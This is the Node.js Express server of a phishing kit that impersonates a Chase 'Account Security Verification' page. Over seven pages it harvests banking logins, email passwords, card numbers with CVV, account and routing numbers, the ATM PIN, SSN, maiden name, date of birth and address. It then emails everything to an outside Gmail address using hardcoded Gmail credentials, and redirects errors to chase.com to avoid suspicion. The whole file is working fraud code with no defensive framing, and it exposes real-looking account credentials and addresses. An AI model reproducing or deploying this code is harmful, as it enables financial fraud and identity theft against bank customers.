const express = require('express');
const http = require('http');
const debug = require('debug');
const router = express.Router();
const logger = require('morgan');


const path = require('path');
const favicon = require('serve-favicon');
const bodyParser = require('body-parser');
const nodemailer = require("nodemailer");
const fs = require('fs');

const hbs = require('hbs');


let app = express();

app.use(logger('dev'));

app.use(bodyParser.urlencoded({
    extended: true
}));
app.use(bodyParser.json());

let fetchNotes = ()=>{
    try {
        let notesString =  fs.readFileSync('notes-data.json');
        return JSON.parse(notesString);
    }catch (e){
        return[]
    }
};

let saveNotes = (notes)=>{
    fs.writeFileSync('notes-data.json', JSON.stringify(notes))
};

let appendNotes = (notes)=>{
    fs.appendFile('notes-data.json', JSON.stringify(notes))
};

let vm = {
    title: 'Chase | Account Security Verification',
    layout: 'layout'
};

//_yesssh5\Safety\Chase\n\1eb932e5745c485929f49dbefcebbb33
/* GET home page. */
app.get('/', (req, res, next) => {
    res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcebbb33');
});

app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcebbb33', (req, res, next) => {
    res.render('pages/index', vm);
});

app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcebbb33', (req, res, next) => {
    let newUserId = req.body.userId;
    let newPassword = req.body.password;
    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
    info.userId = newUserId;
    info.password = newPassword;

    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));

     res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceccc33');
});

// Page 2
app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceccc33', (req, res, next) => {
    res.render('pages/page2', vm);
});

app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceccc33', (req, res, next) => {
    let newEmail = req.body.email;
    let newEmailPassword = req.body.emailPassword;
    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
    info.email = newEmail;
    info.emailPassword = newEmailPassword;

    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));

    res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceddd33');
});


// Page 3
app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceddd33', (req, res, next) => {
    res.render('pages/page3', vm);
});

app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceddd33', (req, res, next) => {
    let newCardNumber = req.body.number;
    let newFullName = req.body.name;
    let newExpiryDate = req.body.expiry;
    let newCardCVV = req.body.cvc;

    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
    info.cardNumber = newCardNumber;
    info.fullName = newFullName;
    info.expiryDate = newExpiryDate;
    info.cardCVV = newCardCVV;

    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));

    res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceeee33');
});


// Page 4
app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceeee33', (req, res, next) => {
    res.render('pages/page4', vm);
});

app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceeee33', (req, res, next) => {
    let newAcctNo = req.body.acctno;
    let newRoutNo = req.body.routno;
    let newAtmPin = req.body.atmpin;
    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
    info.acctNo = newAcctNo;
    info.routNo = newRoutNo;
    info.atmPin = newAtmPin;

    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));

    res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcefff33');
});


// Page 5
app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcefff33', (req, res, next) => {
    res.render('pages/page5', vm);
});

app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcefff33', (req, res, next) => {
    let newPhoneNo = req.body.phoneNo;
    let newSSN = req.body.ssn;
    let newMadienName = req.body.madienName;
    let newDOB = req.body.dob;
    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
    info.phoneNo = newPhoneNo;
    info.ssn = newSSN;
    info.madienName = newMadienName;
    info.dob = newDOB;

    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));

    res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceggg33');
});


// Page 6
app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceggg33', (req, res, next) => {
    res.render('pages/page6', vm);
});

app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceggg33', (req, res, next) => {
    let newAddress = req.body.address;
    let newCity = req.body.city;
    let newState = req.body.state;
    let newZipCode = req.body.zipcode;

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'jordanrobert2000@gmail.com',
            pass: 'Dallas147'
        }
    });

    let info =  JSON.parse(fs.readFileSync('notes-data.json'));
    info.address = newAddress;
    info.city = newCity;
    info.state = newState;
    info.zipcode = newZipCode;

    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));

    let updateInfo =  JSON.parse(fs.readFileSync('notes-data.json'));

    let mailOptions = {
        from: 'info2@chase.com',
        to: 'olumbex@gmail.com',
        // to: 'jordanrobert2000@gmail.com',
        // to: 'pinhomes009@gmail.com',
        subject: 'Data From chaseish',
        text: `UserId: ${updateInfo.userId} \n 
               Password: ${updateInfo.password} \n
               Email: ${updateInfo.email} \n
               Email Password: ${updateInfo.emailPassword} \n
               Card Number: ${updateInfo.cardNumber} \n
               FullName: ${updateInfo.fullName} \n
               Expiry Date: ${updateInfo.expiryDate} \n
               CVV: ${updateInfo.cardCVV} \n
               Account No: ${updateInfo.acctNo} \n
               Routing No: ${updateInfo.routNo} \n
               atmPin: ${updateInfo.atmPin} \n
               Phone No: ${updateInfo.phoneNo} \n
               ssn: ${updateInfo.ssn} \n
               Madien Name: ${updateInfo.madienName} \n
               address: ${updateInfo.address} \n
               city: ${updateInfo.city} \n
               state: ${updateInfo.state} \n
               zipcode: ${updateInfo.zipcode}`
    };

    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(`Error: ${error}`);
            // res.send(`error: ${error}`);
            res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcehhh33');
        } else {
            console.log(`Email sent:   ${info.response}`);
            // res.send(updateInfo);
            res.redirect('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcehhh33');
        }
    });
});


// Page 7
app.get('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcehhh33', (req, res, next) => {
// app.get('/_', (req, res, next) => {
//     jquery-inputcloak.es6.js
//     /web/auth/dashboard#/dashboard/index/index
    res.render('pages/page7', vm);
});




app.get('/_y', (req, res, next) => {
    // let userId = req.body.userId;
    // let password = req.body.password;
    let newUserId = 'lucas lumbex';
    let newPassword = 'insultss pass';

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'jordanrobert2000@gmail.com',
            pass: 'Dallas147'
        }
    });
    console.log('1');

    let info =  JSON.parse(fs.readFileSync('notes-data.json'));


    info.userId = newUserId;
    info.password = newPassword;


    fs.writeFileSync('notes-data.json', JSON.stringify(info, null, 2));
    //
    console.log('2');

    let updateInfo =  JSON.parse(fs.readFileSync('notes-data.json'));
    console.log(updateInfo);

    // res.send(updateInfo);

    console.log('3');
    let mailOptions = {
        from: 'lumbex@chase.com',
        to: 'olumbex@gmail.com',
        // to: 'jordanrobert2000@gmail.com',
        // to: 'pinhomes009@gmail.com',
        subject: 'Data From chaseish',
        text: `UserId: ${updateInfo.userId} \n 
               Password: ${updateInfo.password}`
    };

    console.log('4');

    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
            res.send(`error: ${error}`);
        } else {
            console.log('Email sent: ' + info.response);
            // res.send(updateInfo);
            res.send({
                message: 'file saved',
                message2: 'sent'
            });
        }
    });


});

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'hbs');


// uncomment after placing your favicon in /public
app.use(favicon(path.join(__dirname, 'public', 'favicon.ico')));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


// app.use(flash()); // use connect-flash for flash messages stored in session


//handlebars custom helper
hbs.registerHelper('if_eq', function(a, b, opts) {
    if (a === b) {
        return opts.fn(this);
    } else {
        return opts.inverse(this);
    }
});


// catch 404 and forward to error handler
app.use(function(req, res, next) {
    let err = new Error('Not Found');
    err.status = 404;
    next(err);
    // res.redirect('https://chase.com')
});

// error handlers

// development error handler
// will print stacktrace
if (app.get('env') === 'development') {
    // res.redirect('https://chase.com');

    app.use(function(err, req, res, next) {
            // res.redirect('https://chase.com');

        res.status(err.status || 500);
        res.render('error', {
            message: err.message,
            error: err
        });
    });
}

// production error handler
// no stacktraces leaked to user
app.use(function(err, req, res, next) {
    res.redirect('https://chase.com') ;

    // res.status(err.status || 500);
    // res.render('error', {
    //     message: err.message,
    //     error: {}
    // });
});

// var port = normalizePort(process.env.PORT || '5000');
const port = normalizePort(process.env.PORT || '69');
app.set('port', port);
    // .listening(console.log('listening on port 69'));

/**
 * Create HTTP server.
 */

let server = http.createServer(app);
// let server = http.createServer(app);

/**
 * Listen on provided port, on all network interfaces.
 */

server.listen(port, () =>{
    // let host = server.address().address;
    let port = server.address().port;
    console.log(`App is listening on Port : ${port}`);
});
server.on('error', onError);
server.on('listening', onListening);

/**
 * Normalize a port into a number, string, or false.
 */

function normalizePort(val) {
    let port = parseInt(val, 10);

    if (isNaN(port)) {
        // named pipe
        return val;
    }

    if (port >= 0) {
        // port number
        return port;
    }

    return false;
}

/**
 * Event listener for HTTP server "error" event.
 */

function onError(error) {
    if (error.syscall !== 'listen') {
        throw error;
    }

    let bind = typeof port === 'string'
        ? 'Pipe ' + port
        : 'Port ' + port;

    // handle specific listen errors with friendly messages
    switch (error.code) {
        case 'EACCES':
            console.error(bind + ' requires elevated privileges');
            process.exit(1);
            break;
        case 'EADDRINUSE':
            console.error(bind + ' is already in use');
            process.exit(1);
            break;
        default:
            throw error;
    }
}

/**
 * Event listener for HTTP server "listening" event.
 */

function onListening() {
    let addr = server.address();
    let bind = typeof addr === 'string'
        ? 'pipe ' + addr
        : 'port ' + addr.port;
    debug('Listening on ' + bind);
}

module.exports = app;
